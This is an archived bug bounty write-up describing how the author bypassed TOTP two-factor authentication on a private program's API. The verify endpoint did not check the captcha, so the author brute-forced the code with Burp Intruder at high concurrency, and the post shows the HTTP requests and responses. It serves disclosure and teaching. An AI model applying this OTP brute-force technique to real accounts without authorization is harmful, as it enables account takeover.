---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-07-26_how-i-bypassed-2fa-in-a-3-years-old-private-program.md
original_filename: 2020-07-26_how-i-bypassed-2fa-in-a-3-years-old-private-program.md
title: How I bypassed 2fa in a 3 years old private program!
category: documents
detected_topics:
- mfa
- rate-limit
- access-control
- command-injection
- otp
- automation-abuse
tags:
- imported
- documents
- mfa
- rate-limit
- access-control
- command-injection
- otp
- automation-abuse
language: en
raw_sha256: 7c84b273a54e07c58b5f8d685813eecb6cd261698855bb5db8b7b14171c7108b
text_sha256: c710b3ef8f6349a19386357880b626bdc2ddcbf7f6d046e9682a3800b9fe2f5a
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: true
---

# How I bypassed 2fa in a 3 years old private program!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-07-26_how-i-bypassed-2fa-in-a-3-years-old-private-program.md
- Source Type: markdown
- Detected Topics: mfa, rate-limit, access-control, command-injection, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: True
- Raw SHA256: `7c84b273a54e07c58b5f8d685813eecb6cd261698855bb5db8b7b14171c7108b`
- Text SHA256: `c710b3ef8f6349a19386357880b626bdc2ddcbf7f6d046e9682a3800b9fe2f5a`


## Content

---
title: "How I bypassed 2fa in a 3 years old private program!"
page_title: "2FA Bypass | Shivangx01b"
url: "https://shivangx01b.github.io/2fa_bypass/"
final_url: "https://shivangx01b.github.io/2fa_bypass/"
authors: ["Shivangx01b (@shivangx01b)"]
bugs: ["2FA / MFA bypass", "Bruteforce", "Lack of rate limiting"]
publication_date: "2020-07-26"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4384
---

July 26, 2020  3 min to read

# 2FA Bypass

![Featured image](https://i.ibb.co/pftczhd/2fa-bypass.png)

## How I bypassed 2fa in a 3 years old private program!

When I was invited to this private program say “private.com” I was bit discouraged as it was 3 years old program with only 3 eligible scope and I thought that many hackers must have hammered it hard and finding a bug here would just be a waste of time.

But any way I started IDK why …FFF..

![Alt Text](https://i.ibb.co/s1XLQtp/idk.gif)

So after doing some dirsearch I found 2 open redirects in like ~ 3 mins…But got a duplicate when I submitted the report.

Then I jumped to app.private.com to try some auth flaws and with a hope that no one ever looked here even though it’s a 3 year old program…just in case ?

![Alt Text](https://media.giphy.com/media/8GclDP2l4qbx6/giphy.gif)

After trying some things I decided to try some rate limit checks on login and 2fa things …Both login and 2fa where protected from google captcha :/

So I tried to remove the captcha header from the request to see if web app is blocking any client side changes…and login request gave me “Invalid Captcha”…But 2fa didn’t !

  * Request with no google captcha headers

  
  
  POST /2fa/verify HTTP/1.1
  Host: api.private.com
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
  Accept: application/json, text/plain, */*
  Accept-Language: en-GB,en;q=0.5
  Accept-Encoding: gzip, deflate
  Content-Type: application/json;charset=utf-8
  Authorization: Bearer ***REDACTED***
  Content-Length: 17
  Origin: https://app.private.com
  Connection: close
  Referer: https://app.private.com
  
  {"code":"123456"}
  

  * Response

  
  
  HTTP/1.1 401 Unauthorized
  Date: Thu, 18 Jun 2020 06:08:12 GMT
  Content-Type: application/json
  Content-Length: 36
  Connection: close
  Access-Control-Allow-Origin: https://app.private.io
  Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS
  Access-Control-Allow-Credentials: true
  
  {"message":"Wrong code! Try again."}
  

No “Invalid Captcha” response now.

![Alt Text](https://media.giphy.com/media/DffShiJ47fPqM/giphy.gif)

Time to spin up the intruder and brute the code !…I used burp pro as I can change the threads. You can use turbo intruder or a simple Python/Go code with concurrent requests to brute it.

But web app uses Google Authenticator so we have only like ~ 59 secs to get the code

So I used 888 threads with 500 steps ( I could make it more fast and stable with some basic go codes but anyway I only had to give a poc to show that this attack works).

And in grep added the “Try again” to be checked in response

![Alt Text](https://i.ibb.co/48xDJFM/attack-prep3.png)

![Alt Text](https://i.ibb.co/b3hLFPV/attack-prep2.png)

After like ~ 7 or 9 tries I filtered the response and one request managed to hit the correct TOTP (just some correct time game)

  * Request

  
  
  POST /2fa/verify HTTP/1.1
  Host: api.private.com
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
  Accept: application/json, text/plain, */*
  Accept-Language: en-GB,en;q=0.5
  Accept-Encoding: gzip, deflate
  Content-Type: application/json;charset=utf-8
  Authorization: Bearer ***REDACTED***
  Content-Length: 17
  Origin: https://app.private.com
  Connection: close
  Referer: https://app.private.com
  
  {"code":"XXXXXX"}
  

  * Response

  
  
  HTTP/1.1 200 OK
  Date: Thu, 18 Jun 2020 06:12:08 GMT
  Content-Type: application/json
  Content-Length: 38
  Connection: close
  Access-Control-Allow-Origin: https://app.private.com
  Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS
  Access-Control-Allow-Credentials: true
  
  {"message":"Verification successfull"}
  

Submited the report and got the bounty $_$

![Alt Text](https://media.giphy.com/media/gTURHJs4e2Ies/giphy.gif)

  * Takeaway 
  * Just try even if at first sight it dosen’t make sense
  * Don’t Give Up
